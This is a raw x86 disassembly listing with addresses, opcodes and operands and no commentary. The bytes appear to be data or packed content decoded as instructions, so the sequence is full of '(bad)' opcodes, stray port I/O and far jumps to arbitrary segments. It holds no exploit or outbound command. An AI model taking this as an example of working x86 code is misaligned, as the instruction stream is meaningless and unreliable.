  42dab2:	cmp    BYTE PTR [ebx-0x1a],0x9e
  42dab6:	add    eax,0x7ec16a25
  42dabb:	aaa    
  42dabc:	cmp    al,0xc6
  42dabe:	fisub  DWORD PTR [ecx-0x72]
  42dac1:	jno    0x42dac6
  42dac3:	and    edi,eax
  42dac5:	sbb    DWORD PTR [ecx+0x17],ecx
  42dac8:	bound  eax,QWORD PTR ds:0x1ac2fa31
  42dace:	mov    ds:0x21eba184,al
  42dad3:	imul   DWORD PTR ss:[ebp+eiz*4-0x56]
  42dad8:	push   0x6e
  42dada:	mov    ebp,0x740b585e
  42dadf:	lods   eax,DWORD PTR ds:[esi]
  42dae0:	scas   eax,DWORD PTR es:[edi]
  42dae1:	stos   DWORD PTR es:[edi],eax
  42dae2:	jecxz  0x42da67
  42dae4:	rcl    bh,cl
  42dae6:	cmp    edx,DWORD PTR ds:0x8733420e
  42daec:	sub    eax,0x176e9c97
  42daf1:	inc    edx
  42daf2:	cmp    al,0x22
  42daf4:	int    0x61
  42daf6:	mov    eax,edi
  42daf8:	xchg   BYTE PTR [ebx],cl
  42dafa:	(bad)  
  42dafb:	mov    esp,0x83297b4
  42db00:	sbb    ebx,DWORD PTR [edi]
  42db02:	icebp  
  42db03:	std    
  42db04:	call   FWORD PTR ds:0xdb094c3b
  42db0a:	mov    bh,0x45
  42db0c:	lock sbb cl,ah
  42db0f:	rol    DWORD PTR [eax+eax*1+0x0],1
	...
  42db73:	add    BYTE PTR [eax-0x2093e086],dh
  42db79:	ins    DWORD PTR es:[edi],dx
  42db7a:	repz (bad) 
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42db4d
  42db81:	xchg   esi,eax
  42db82:	in     eax,dx
  42db83:	add    al,0x3b
  42db85:	jmp    0x0:0x1050001
  42db8c:	test   eax,0xb35a3adc
  42db91:	(bad)  
  42db92:	mov    eax,0xef72b872
  42db97:	les    edx,FWORD PTR [edx+0x1c1e0cdd]
  42db9d:	fdivr  QWORD PTR [esi]
  42db9f:	mov    WORD PTR [eax+0x16],ds
  42dba2:	(bad)  
  42dba4:	jle    0x42db77
  42dba6:	not    BYTE PTR [ebp-0x67]
  42dba9:	imul   edi,DWORD PTR [eax-0x6bff64ac],0xf3707543
  42dbb3:	push   es
  42dbb4:	sub    eax,0x7ee126b5
  42dbb9:	and    BYTE PTR ds:0x312ba07b,dl
  42dbbf:	xchg   BYTE PTR [edx-0x27],al
  42dbc2:	(bad)  
  42dbc3:	fimul  WORD PTR [ebx-0x4]
  42dbc6:	popa   
  42dbc7:	cdq    
  42dbc8:	je     0x42dbce
  42dbca:	pop    eax
  42dbcb:	pop    esp
  42dbcc:	mov    bh,0xbc
  42dbce:	minps  xmm7,xmm6
  42dbd1:	sub    al,0xcb
  42dbd3:	bound  ebx,QWORD PTR [ecx-0x7d555068]
  42dbd9:	sbb    DWORD PTR [esi],esp
  42dbdb:	push   es
  42dbdc:	fimul  DWORD PTR [esi]
  42dbde:	add    DWORD PTR [eax],esi
  42dbe0:	xor    ch,BYTE PTR [eax+0x30]
  42dbe3:	pop    ebp
  42dbe4:	cdq    
  42dbe5:	js     0x42dc0f
  42dbe7:	mov    al,0xb6
  42dbe9:	xor    dh,BYTE PTR [eax-0x1a5149fa]
  42dbef:	cld    
  42dbf0:	xor    dl,BYTE PTR [esp+eiz*8]
  42dbf3:	aam    0x7d
  42dbf5:	xchg   esp,eax
  42dbf6:	push   cs
  42dbf7:	pop    edi
  42dbf8:	sbb    edi,DWORD PTR [eax+0x7bff2fc0]
  42dbfe:	jmp    0x42dc13
  42dc00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dc01:	in     al,0xa7
  42dc03:	jp     0x42dc49
  42dc05:	test   BYTE PTR [eax-0x28095a62],0x69
  42dc0c:	(bad)  
  42dc0d:	mov    al,BYTE PTR [edi]
  42dc0f:	ins    BYTE PTR es:[edi],dx
  42dc10:	cdq    
  42dc11:	jmp    0x7981:0x7e08e015
  42dc18:	push   0xb7373eb5
  42dc1d:	xor    BYTE PTR [ebp-0x5b],0x84
  42dc21:	pushf  
  42dc22:	(bad)  
  42dc23:	push   ebp
  42dc24:	cmp    eax,0xffffff90
  42dc27:	mov    ebp,0x229cd026
  42dc2c:	add    cl,BYTE PTR [ebx+0x38178917]
  42dc32:	je     0x42dc6e
  42dc34:	xor    eax,0xd6f24794
  42dc39:	sahf   
  42dc3a:	test   al,0xa
  42dc3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dc3d:	fadd   DWORD PTR gs:[edi-0x1e]
  42dc41:	cli    
  42dc42:	ja     0x42dc0b
  42dc44:	pop    eax
  42dc45:	add    DWORD PTR [edi],eax
  42dc47:	mov    bh,0xad
  42dc49:	and    dh,BYTE PTR [edi-0x19]
  42dc4c:	sub    al,0x70
  42dc4e:	stos   DWORD PTR es:[edi],eax
  42dc4f:	cmp    eax,0x59cf4072
  42dc54:	xchg   edx,eax
  42dc55:	jecxz  0x42dcca
  42dc57:	retf   
  42dc58:	clc    
  42dc59:	mov    ch,cl
  42dc5b:	mov    ecx,0xf5d06001
  42dc60:	jo     0x42dcd4
  42dc62:	adc    eax,DWORD PTR [esi]
  42dc64:	push   0x35
  42dc66:	jmp    0xec9b:0x848a61af
  42dc6d:	sub    al,0x9
  42dc6f:	mov    esp,0x784167d7
  42dc74:	mov    WORD PTR [edi+edx*8+0x7],?
  42dc78:	xchg   BYTE PTR [ecx+0x3dc0921],al
  42dc7e:	lock (bad) 
  42dc80:	mov    ch,0x13
  42dc82:	cdq    
  42dc83:	mov    al,ds:0xa55054ce
  42dc88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dc89:	stc    
  42dc8a:	stos   DWORD PTR es:[edi],eax
  42dc8b:	dec    edi
  42dc8c:	arpl   WORD PTR [ecx+0x4a],ax
  42dc8f:	or     DWORD PTR [ebx+0x0],eax
	...
  42dcf2:	add    BYTE PTR [eax],al
  42dcf4:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	push   cs
  42dd01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dd02:	or     BYTE PTR [ebx],0x40
  42dd05:	jmp    0x42dd08
  42dd07:	add    BYTE PTR ds:0x76000001,al
  42dd0d:	sahf   
  42dd0e:	jb     0x42dd1a
  42dd10:	xor    al,0xb4
  42dd12:	xor    bh,BYTE PTR [eax-0x47]
  42dd15:	cmc    
  42dd16:	rcr    DWORD PTR [ecx],0x68
  42dd19:	daa    
  42dd1a:	cwde   
  42dd1b:	inc    ecx
  42dd1c:	jbe    0x42dd00
  42dd1e:	mov    eax,0xa65f6dc3
  42dd23:	(bad)  [edx+0x18]
  42dd26:	pop    esi
  42dd27:	push   0x7b3889ae
  42dd2c:	pop    ecx
  42dd2d:	test   DWORD PTR [esp+ecx*4-0x22389696],edi
  42dd34:	(bad)  
  42dd35:	mov    ds:0x31b15dd1,al
  42dd3a:	xchg   ebp,eax
  42dd3b:	ret    
  42dd3c:	xor    al,0x3e
  42dd3f:	pusha  
  42dd40:	mov    eax,0xe3b00e61
  42dd45:	xlat   BYTE PTR ds:[ebx]
  42dd46:	or     eax,0x56799ebc
  42dd4b:	lahf   
  42dd4c:	stos   DWORD PTR es:[edi],eax
  42dd4d:	out    0xb7,eax
  42dd4f:	lods   eax,DWORD PTR ds:[esi]
  42dd50:	sti    
  42dd51:	bound  eax,QWORD PTR [eax]
  42dd53:	loopne 0x42dd21
  42dd55:	dec    esp
  42dd56:	or     al,0x6b
  42dd58:	clc    
  42dd59:	mov    edx,0x8e32b46a
  42dd5e:	pop    edx
  42dd5f:	scas   al,BYTE PTR es:[edi]
  42dd60:	aas    
  42dd61:	dec    ebp
  42dd62:	repnz pop ebx
  42dd64:	aad    0x4c
  42dd66:	mov    edi,0x4994ea6
  42dd6b:	mov    ebx,0x8b2ea49a
  42dd70:	retf   0x6d2
  42dd73:	pop    esi
  42dd74:	lods   al,BYTE PTR ds:[esi]
  42dd75:	jo     0x42dd9d
  42dd77:	js     0x42dd6a
  42dd79:	mov    dh,0x92
  42dd7b:	rcr    dh,cl
  42dd7d:	jo     0x42ddf4
  42dd7f:	out    dx,eax
  42dd80:	push   ebx
  42dd81:	aam    0xf8
  42dd83:	pop    ebx
  42dd84:	xchg   edx,eax
  42dd85:	popf   
  42dd86:	lea    esi,[edi+0x1d2589a0]
  42dd8c:	sbb    al,0x5f
  42dd8e:	dec    ecx
  42dd8f:	pop    eax
  42dd90:	rcl    bl,0x77
  42dd93:	inc    ebp
  42dd94:	lea    eax,[eax-0x197094a7]
  42dd9a:	mov    cl,0x52
  42dd9c:	(bad)  
  42dd9d:	sbb    al,0x70
  42dd9f:	and    DWORD PTR [ebx+0x55],0x981f418f
  42dda6:	sub    bl,BYTE PTR [ecx+0x7a8feaea]
  42ddac:	xchg   ecx,eax
  42ddad:	sbb    eax,DWORD PTR [edi-0x6e]
  42ddb0:	(bad)
  42ddb3:	lods   al,BYTE PTR ds:[esi]
  42ddb4:	jmp    0x42ddfb
  42ddb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ddb7:	ins    BYTE PTR es:[edi],dx
  42ddb8:	adc    eax,0xd63d8adc
  42ddbd:	aam    0x3f
  42ddbf:	mov    dl,0x7e
  42ddc1:	retf   
  42ddc2:	or     BYTE PTR [ebx],al
  42ddc4:	(bad)  
  42ddc5:	popf   
  42ddc6:	jle    0x42ddf7
  42ddc8:	cs push es
  42ddca:	lods   eax,DWORD PTR gs:[esi]
  42ddcc:	sbb    DWORD PTR [ebx],esp
  42ddce:	aaa    
  42ddcf:	out    0xfe,al
  42ddd1:	out    0x5e,eax
  42ddd3:	sbb    BYTE PTR [ecx],bl
  42ddd5:	sub    DWORD PTR [ecx-0x55],edi
  42ddd8:	in     eax,0xc0
  42ddda:	inc    ecx
  42dddb:	iret   
  42dddc:	icebp  
  42dddd:	jb     0x42dd74
  42dddf:	sub    BYTE PTR [edi+ebx*1],dh
  42dde2:	sbb    BYTE PTR [edx-0xaf2c18e],bh
  42dde8:	mov    ah,0xf6
  42ddea:	mov    ecx,0x1aa77272
  42ddef:	sbb    BYTE PTR [edi+0x2ee2aa3f],cl
  42ddf5:	jmp    0x68c4:0x1acf066f
  42ddfc:	loopne 0x42dda4
  42ddfe:	(bad)  
  42ddff:	jo     0x42ddfe
  42de01:	and    al,0xa2
  42de03:	loop   0x42dddb
  42de05:	inc    BYTE PTR [edx+edi*2]
  42de08:	test   al,0x7a
  42de0a:	stos   BYTE PTR es:[edi],al
  42de0b:	test   DWORD PTR [eax-0x1b56d601],ebx
	...
  42de71:	add    BYTE PTR [eax],al
  42de73:	add    dh,ah
  42de75:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	push   0xfffffff8
  42de82:	jmp    0x22f2432
  42de87:	add    BYTE PTR ds:0x82000001,al
  42de8d:	dec    ebx
  42de8e:	popa   
  42de8f:	push   cs
  42de90:	fcomp  st(6)
  42de92:	dec    ebx
  42de93:	and    edi,ebx
  42de95:	cdq    
  42de96:	mov    edi,0x71b3460a
  42de9b:	jnp    0x42de37
  42de9d:	lods   eax,DWORD PTR ds:[esi]
  42de9e:	fnstcw WORD PTR [edx-0x49]
  42dea1:	scas   eax,DWORD PTR es:[edi]
  42dea2:	cmp    eax,ecx
  42dea4:	test   esp,ecx
  42dea6:	mov    eax,0x317dc1f1
  42deab:	jmp    0x1fac1c87
  42deb0:	xchg   BYTE PTR [edx+0x18],dh
  42deb3:	jns    0x42de65
  42deb5:	xor    eax,0x27d0a24d
  42deba:	mov    esi,0x54e27108
  42debf:	pop    esp
  42dec0:	sub    eax,DWORD PTR [esi+edx*4-0x8]
  42dec4:	pop    es
  42dec5:	pop    ebp
  42dec6:	cmp    bh,cl
  42dec8:	xor    BYTE PTR [ebp-0x300cd1be],bh
  42dece:	pop    edi
  42decf:	cs inc ebx
  42ded1:	pop    ds
  42ded2:	adc    DWORD PTR [esi+0x6a],esi
  42ded5:	cmovne esp,DWORD PTR [edi-0x70]
  42ded9:	push   es
  42deda:	cmc    
  42dedb:	cli    
  42dedc:	and    cl,BYTE PTR [esi-0x6c]
  42dedf:	loop   0x42de83
  42dee1:	or     DWORD PTR [edi-0x2e],edi
  42dee4:	js     0x42df65
  42dee6:	adc    esp,ecx
  42dee8:	or     dh,ah
  42deea:	dec    ecx
  42deeb:	dec    edx
  42deec:	inc    eax
  42deed:	in     eax,dx
  42deee:	push   esp
  42deef:	(bad)  
  42def0:	test   BYTE PTR [ecx+edx*2-0x14],0x8a
  42def5:	mov    cl,0x3f
  42def7:	jo     0x42df5a
  42def9:	cmp    eax,0x5397a1a8
  42defe:	loop   0x42df36
  42df00:	fidivr WORD PTR [edx]
  42df02:	mov    edi,ecx
  42df04:	and    dl,ch
  42df06:	dec    edi
  42df07:	and    eax,0x6f627ee
  42df0c:	sbb    al,0x81
  42df0e:	stos   BYTE PTR es:[edi],al
  42df0f:	dec    ecx
  42df10:	sub    esp,edx
  42df12:	sub    DWORD PTR [ebp+0x2a],ebp
  42df15:	daa    
  42df16:	add    DWORD PTR [eax-0x6446d728],0xffffff9b
  42df1d:	out    0x11,al
  42df1f:	or     eax,0xa3d81ce3
  42df24:	call   0xd62360a4
  42df29:	std    
  42df2a:	push   esp
  42df2b:	push   ebp
  42df2c:	das    
  42df2d:	mov    WORD PTR [edi-0x45b79e1a],?
  42df33:	outs   dx,BYTE PTR ds:[esi]
  42df34:	mov    esi,0xf2732f84
  42df39:	pop    ebx
  42df3a:	mov    eax,ds:0x87cefccf
  42df3f:	xchg   ebp,eax
  42df40:	and    DWORD PTR [ebx-0x107b3242],0xd568547
  42df4a:	outs   dx,DWORD PTR ds:[esi]
  42df4b:	icebp  
  42df4c:	loopne 0x42dfaa
  42df4e:	nop
  42df4f:	ret    
  42df50:	mov    cl,0x8c
  42df52:	xchg   DWORD PTR [edx],esi
  42df54:	mov    edi,0x7daa0a39
  42df59:	jg     0x42df59
  42df5b:	sub    DWORD PTR [edx+0x1ebb95bd],edi
  42df61:	dec    ebx
  42df62:	rcl    BYTE PTR [edi+0x60b95270],cl
  42df68:	data16 hlt 
  42df6a:	mov    al,0xd6
  42df6c:	jle    0x42df37
  42df6e:	loop   0x42df0a
  42df70:	call   0xb6bfd803
  42df75:	mov    al,ds:0xf213a18b
  42df7a:	imul   ecx,esp,0xd27daf42
  42df80:	popf   
  42df81:	gs mov eax,0xd722bba1
  42df87:	mov    ch,0x48
  42df89:	or     eax,0xf3579487
  42df8e:	sub    dl,ch
  42df90:	push   ds
	...
  42dff1:	add    BYTE PTR [eax],al
  42dff3:	add    BYTE PTR [edx],al
  42dff5:	(bad)  
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi+0x34]
  42e001:	cmp    DWORD PTR [esi-0x4],ecx
  42e004:	dec    edx
  42e005:	in     eax,dx
  42e006:	add    DWORD PTR [eax],eax
  42e008:	add    eax,0xd000001
  42e00d:	adc    dh,BYTE PTR [edi]
  42e00f:	lahf   
  42e010:	sbb    eax,0xe6a45022
  42e015:	fwait
  42e016:	mov    esi,0xb174b26f
  42e01b:	jp     0x42e05a
  42e01d:	pop    edx
  42e01e:	popa   
  42e01f:	outs   dx,DWORD PTR ds:[esi]
  42e020:	sbb    BYTE PTR [ebx],0x72
  42e023:	pop    es
  42e024:	sbb    ch,BYTE PTR [ebx+0x10]
  42e027:	(bad)  
  42e028:	xlat   BYTE PTR ds:[ebx]
  42e029:	outs   dx,BYTE PTR ds:[esi]
  42e02a:	or     eax,DWORD PTR [ebx-0x1c]
  42e02d:	mov    bh,0x19
  42e02f:	loope  0x42dff1
  42e031:	ins    BYTE PTR es:[edi],dx
  42e032:	xor    al,0xc1
  42e034:	mov    ebp,0x52becec
  42e039:	adc    DWORD PTR [ecx-0xc],ebx
  42e03c:	xlat   BYTE PTR ds:[ebx]
  42e03d:	jge    0x42dffb
  42e03f:	in     al,dx
  42e040:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e041:	pop    esp
  42e042:	mov    esi,0xf43a2a10
  42e047:	jge    0x42e033
  42e049:	pop    es
  42e04a:	mov    bl,0x63
  42e04c:	(bad)  
  42e04d:	das    
  42e04e:	cmc    
  42e04f:	rol    BYTE PTR [esi+0x1c633723],1
  42e055:	inc    ecx
  42e056:	test   al,0xca
  42e058:	jae    0x42e0c9
  42e05a:	out    dx,eax
  42e05b:	outs   dx,BYTE PTR ds:[esi]
  42e05c:	loope  0x42e03e
  42e05e:	rcl    BYTE PTR [ebx],1
  42e060:	sub    dl,BYTE PTR [ebx+0x48]
  42e063:	mul    DWORD PTR [eax-0x4e]
  42e066:	retf   
  42e067:	jecxz  0x42dfff
  42e069:	scas   al,BYTE PTR es:[edi]
  42e06a:	xlat   BYTE PTR ds:[ebx]
  42e06b:	xchg   esp,eax
  42e06c:	adc    esi,edx
  42e06e:	js     0x42e058
  42e070:	(bad)  
  42e071:	cldemote BYTE PTR [ecx]
  42e074:	dec    eax
  42e075:	cmp    dh,ah
  42e077:	retf   
  42e078:	hlt    
  42e079:	fcomp  st(5)
  42e07b:	in     eax,dx
  42e07c:	les    edi,FWORD PTR [edi-0x6b66dd68]
  42e082:	aaa    
  42e083:	add    ecx,DWORD PTR [esi-0x21cdcfba]
  42e089:	mov    ss,WORD PTR [esi-0x397bae39]
  42e08f:	inc    esp
  42e090:	sub    al,0x77
  42e092:	mov    bl,0x2f
  42e094:	jp     0x42e07d
  42e096:	fsub   st,st(6)
  42e098:	cmp    ah,dh
  42e09a:	fcomp  QWORD PTR [ecx+0x30]
  42e09d:	sub    BYTE PTR [ecx+0x40ba8ddc],ah
  42e0a3:	sub    DWORD PTR ds:0x1ed2dd7,ebp
  42e0aa:	loope  0x42e070
  42e0ac:	mov    ?,WORD PTR [eax-0x79dffc89]
  42e0b2:	add    esp,DWORD PTR [edi-0x65]
  42e0b5:	nop
  42e0b6:	std    
  42e0b7:	scas   al,BYTE PTR es:[edi]
  42e0b8:	add    bh,ah
  42e0ba:	or     ah,al
  42e0bc:	retf   0x8c5
  42e0bf:	js     0x42e049
  42e0c1:	xor    eax,0x617832ca
  42e0c6:	ins    DWORD PTR es:[edi],dx
  42e0c7:	dec    eax
  42e0c8:	je     0x42e102
  42e0ca:	ss loope 0x42e0bc
  42e0cd:	push   edx
  42e0ce:	and    al,0x1d
  42e0d0:	xchg   esi,eax
  42e0d1:	inc    ecx
  42e0d2:	nop
  42e0d3:	cmp    ebx,DWORD PTR [edx+0x68]
  42e0d6:	jp     0x42e06a
  42e0d8:	adc    ecx,DWORD PTR ds:0x9beac808
  42e0de:	lea    ebp,[ebx-0x4f]
  42e0e1:	call   0x1bb4:0xa3c1a189
  42e0e8:	mov    ebp,0x9baa5cac
  42e0ed:	mov    ecx,0x529c1f3b
  42e0f2:	gs push 0xffffffe7
  42e0f5:	loope  0x42e112
  42e0f7:	lods   eax,DWORD PTR ds:[esi]
  42e0f8:	cmp    eax,0xfbf0995
  42e0fd:	mov    ecx,0xe988b729
  42e102:	int3   
  42e103:	ss or  eax,0x18201ccb
  42e109:	mov    eax,ds:0x8dd8d209
  42e10e:	mov    eax,0xa4bd
	...
  42e173:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	push   0x4fc44109
  42e185:	out    dx,al
  42e186:	add    DWORD PTR [eax],eax
  42e188:	add    eax,0x90000001
  42e18d:	add    DWORD PTR [esi-0x5],0xe46e4bb2
  42e194:	and    eax,0xb48b13fc
  42e199:	pop    ebp
  42e19a:	fistp  WORD PTR [ebx-0x68]
  42e19d:	and    bh,BYTE PTR [ecx+0x59]
  42e1a0:	(bad)  
  42e1a1:	adc    cl,dl
  42e1a3:	loopne 0x42e146
  42e1a5:	fwait
  42e1a6:	mov    bh,0xf5
  42e1a8:	cwde   
  42e1a9:	call   0x2514:0x9ec4b9b9
  42e1b0:	gs hlt 
  42e1b2:	dec    esi
  42e1b3:	(bad)  
  42e1b5:	int3   
  42e1b6:	out    dx,al
  42e1b7:	xor    esi,DWORD PTR [edx]
  42e1b9:	dec    edx
  42e1ba:	and    eax,0x466cdeed
  42e1bf:	and    DWORD PTR [ecx],edi
  42e1c1:	cmp    al,0x19
  42e1c3:	inc    ecx
  42e1c4:	inc    edx
  42e1c5:	es xor ch,ah
  42e1c8:	pushfw 
  42e1ca:	ret    0x7bf7
  42e1cd:	push   edx
  42e1ce:	sti    
  42e1cf:	stos   DWORD PTR es:[edi],eax
  42e1d0:	inc    ecx
  42e1d1:	fisub  DWORD PTR [esi]
  42e1d3:	xor    al,0x87
  42e1d5:	pop    ebp
  42e1d6:	ret    
  42e1d7:	sar    BYTE PTR [eax],cl
  42e1d9:	jg     0x42e1ef
  42e1db:	popa   
  42e1dc:	pop    ecx
  42e1dd:	mov    edx,0x7e451f6d
  42e1e2:	jmp    0x4e49:0xe8b2dbe
  42e1e9:	data16 lods al,BYTE PTR ds:[esi]
  42e1eb:	inc    ebp
  42e1ec:	scas   al,BYTE PTR es:[edi]
  42e1ed:	shl    BYTE PTR [esi],cl
  42e1ef:	adc    dl,BYTE PTR [edx-0x46]
  42e1f2:	imul   eax,eax,0xffffffb1
  42e1f5:	call   0xddba:0x4fd1bb0a
  42e1fc:	lea    edx,[esi]
  42e1fe:	repnz sbb esp,DWORD PTR [ebx]
  42e201:	stos   BYTE PTR es:[edi],al
  42e202:	cmp    BYTE PTR [edi-0x4],bl
  42e205:	lods   al,BYTE PTR ds:[esi]
  42e206:	cld    
  42e207:	xchg   DWORD PTR [eax+0x41d70e0],ebx
  42e20d:	adc    BYTE PTR [ebp-0x3fd1b3aa],dl
  42e213:	sti    
  42e214:	mov    dh,0x57
  42e216:	mov    ecx,edx
  42e218:	add    ah,BYTE PTR [eax+0x63efa62c]
  42e21e:	dec    esi
  42e21f:	add    al,0xb
  42e221:	fdiv   QWORD PTR [eax+0x56]
  42e224:	and    BYTE PTR [eax+ecx*8],ah
  42e227:	cmp    eax,0x230b11ea
  42e22c:	ins    BYTE PTR es:[edi],dx
  42e22d:	mov    al,0x8a
  42e22f:	add    eax,DWORD PTR [eax+ebp*8-0x524aed13]
  42e236:	mov    cl,0x55
  42e238:	xchg   edi,eax
  42e239:	out    0x50,eax
  42e23b:	pmaxsw mm6,QWORD PTR ds:0x646aed4b
  42e242:	xor    BYTE PTR [ebp+edx*1-0x3cc6b9fe],al
  42e249:	jge    0x42e1f3
  42e24b:	loopne 0x42e23e
  42e24d:	mov    esi,0x41b1070f
  42e252:	xchg   edi,eax
  42e253:	retf   
  42e254:	rcr    BYTE PTR [ebx-0x79],1
  42e257:	mov    ebp,0x13ad8f26
  42e25c:	hlt    
  42e25d:	sub    DWORD PTR [eax],0xde1d94bc
  42e263:	and    eax,0x84f4a4fa
  42e268:	bound  ebx,QWORD PTR [eax]
  42e26a:	and    DWORD PTR [ebx-0x60e33334],eax
  42e270:	mov    edi,0x18adafe5
  42e275:	test   al,0xff
  42e277:	sar    ch,1
  42e279:	mov    bl,0xcd
  42e27b:	out    dx,al
  42e27c:	(bad)  
  42e27d:	jno    0x42e225
  42e27f:	fsubr  QWORD PTR [edx-0x7]
  42e282:	enter  0x376d,0x99
  42e286:	scas   al,BYTE PTR es:[edi]
  42e287:	dec    eax
  42e288:	and    eax,0x47d0b04
  42e28d:	scas   al,BYTE PTR es:[edi]
  42e28e:	mov    ds:0x8dc7,eax
	...
  42e2f3:	add    BYTE PTR [ebp-0x655875c3],ch
  42e2f9:	mov    bh,0xad
  42e2fb:	aas    
  42e2fc:	mov    ebx,0xbb199140
  42e301:	cmp    ecx,DWORD PTR [ecx+0x1ef5409]
  42e307:	add    BYTE PTR ds:0xef000001,al
  42e30d:	stc    
  42e30e:	popf   
  42e30f:	(bad)
  42e312:	pop    eax
  42e313:	bound  esp,QWORD PTR ds:0xa284080c
  42e319:	inc    edi
  42e31a:	add    ch,BYTE PTR [ebx]
  42e31c:	retf   
  42e31d:	jecxz  0x42e2b0
  42e31f:	test   eax,0x82948e6b
  42e324:	call   0x29ba:0x447f7c64
  42e32b:	cmc    
  42e32c:	or     al,0xd4
  42e32e:	pop    ebp
  42e32f:	add    dh,BYTE PTR [esi+0x2a]
  42e332:	mov    ch,0xa5
  42e334:	loop   0x42e2df
  42e336:	cmp    DWORD PTR [ebx+0x1df55247],0xa5d85a42
  42e340:	push   es
  42e341:	popf   
  42e342:	call   0x151c1d2f
  42e347:	mov    dl,0xb0
  42e349:	mov    fs,esp
  42e34b:	push   ds
  42e34c:	dec    edi
  42e34d:	lods   eax,DWORD PTR ds:[esi]
  42e34e:	inc    esp
  42e34f:	pusha  
  42e350:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e351:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e352:	push   edx
  42e353:	mov    bl,0x2c
  42e355:	aaa    
  42e356:	pop    eax
  42e357:	mov    eax,0x9e0001bf
  42e35c:	jle    0x42e3aa
  42e35e:	add    edx,edi
  42e360:	paddd  mm4,QWORD PTR [esi]
  42e363:	(bad)  
  42e364:	in     al,dx
  42e365:	rcr    BYTE PTR [ebx],cl
  42e367:	lock ds je 0x42e36a
  42e36b:	bound  ebp,QWORD PTR [ecx]
  42e36d:	pusha  
  42e36e:	mov    al,ds:0xe7913745
  42e373:	aam    0x29
  42e375:	pop    ds
  42e376:	imul   ebx,DWORD PTR [esi-0x7d],0x8bfbf6b7
  42e37d:	sbb    BYTE PTR [eax-0x1dab3c3a],bl
  42e383:	pcmpeqd mm4,QWORD PTR [esi+0x26b8bb79]
  42e38a:	lods   eax,DWORD PTR ds:[esi]
  42e38b:	jecxz  0x42e371
  42e38d:	mov    bl,0x67
  42e38f:	adc    eax,0x1f6fbf
  42e394:	lods   al,BYTE PTR ds:[esi]
  42e395:	out    dx,al
  42e396:	mov    DWORD PTR [eax],0xbb7cdb5b
  42e39c:	repnz loopne 0x42e374
  42e39f:	rcr    BYTE PTR [eax-0x6ffdf667],1
  42e3a5:	xchg   esi,eax
  42e3a6:	sar    BYTE PTR [edi+edi*8],0x40
  42e3aa:	jbe    0x42e38f
  42e3ac:	sbb    eax,0x6
  42e3af:	les    esi,FWORD PTR ds:0x17f3effe
  42e3b5:	ror    DWORD PTR [eax-0x48],cl
  42e3b8:	dec    edx
  42e3b9:	lods   eax,DWORD PTR ds:[esi]
  42e3ba:	loop   0x42e402
  42e3bc:	outs   dx,BYTE PTR ds:[esi]
  42e3bd:	mov    esp,0x8b1d991e
  42e3c2:	not    BYTE PTR [edx+0x23a911a2]
  42e3c8:	out    dx,eax
  42e3c9:	aad    0x4c
  42e3cb:	mov    edi,0xe1dc377a
  42e3d0:	cdq    
  42e3d1:	lods   eax,DWORD PTR ds:[esi]
  42e3d2:	mov    bl,0xa4
  42e3d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e3d5:	xor    edx,DWORD PTR [esi+ebx*8+0x3ae497fd]
  42e3dc:	aam    0x6c
  42e3de:	inc    ecx
  42e3df:	daa    
  42e3e0:	into   
  42e3e1:	loopne 0x42e419
  42e3e3:	xchg   ebp,eax
  42e3e4:	push   cs
  42e3e5:	or     BYTE PTR [ebp-0x4878d8f],bh
  42e3eb:	xchg   ebx,eax
  42e3ec:	shr    BYTE PTR [edi-0x58],1
  42e3ef:	call   0x824bd2e9
  42e3f4:	in     eax,dx
  42e3f5:	inc    edi
  42e3f6:	imul   eax,esi,0x76fac7fe
  42e3fc:	cwde   
  42e3fd:	push   es
  42e3fe:	xlat   BYTE PTR ds:[ebx]
  42e3ff:	mov    ebp,DWORD PTR [esi+0x18]
  42e402:	aas    
  42e403:	int3   
  42e404:	loope  0x42e3e8
  42e406:	inc    ebp
  42e407:	mov    ecx,es
  42e409:	div    eax
  42e40b:	popf   
  42e40c:	sub    BYTE PTR [edx+0x57baea],al
	...
  42e472:	add    BYTE PTR [eax],al
  42e474:	loop   0x42e433
  42e476:	fadd   st(7),st
  42e478:	(bad)  
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	xchg   BYTE PTR [ecx-0x15],al
  42e483:	rcr    DWORD PTR [ecx-0x10],0x1
  42e487:	add    BYTE PTR ds:0x9e000001,al
  42e48d:	sbb    al,al
  42e48f:	loopne 0x42e418
  42e491:	inc    eax
  42e492:	into   
  42e493:	jae    0x42e513
  42e495:	or     eax,0x9996df5
  42e49a:	mov    ah,0x43
  42e49c:	xchg   esp,eax
  42e49d:	mov    al,ds:0xd54e19a4
  42e4a2:	popf   
  42e4a3:	mov    ds,esi
  42e4a5:	and    al,0x69
  42e4a7:	push   ss
  42e4a8:	pop    ebx
  42e4a9:	ficom  WORD PTR [ebx+0x72]
  42e4ac:	inc    ecx
  42e4ad:	aas    
  42e4ae:	addr16 mov al,ds:0xd593
  42e4b2:	iret   
  42e4b3:	out    0xfa,al
  42e4b5:	xor    al,0x9c
  42e4b7:	scas   al,BYTE PTR es:[edi]
  42e4b8:	push   esp
  42e4b9:	pop    es
  42e4ba:	mov    ds:0xd2262d2e,al
  42e4bf:	scas   eax,DWORD PTR es:[edi]
  42e4c0:	cmp    edi,DWORD PTR [ecx-0x74030d01]
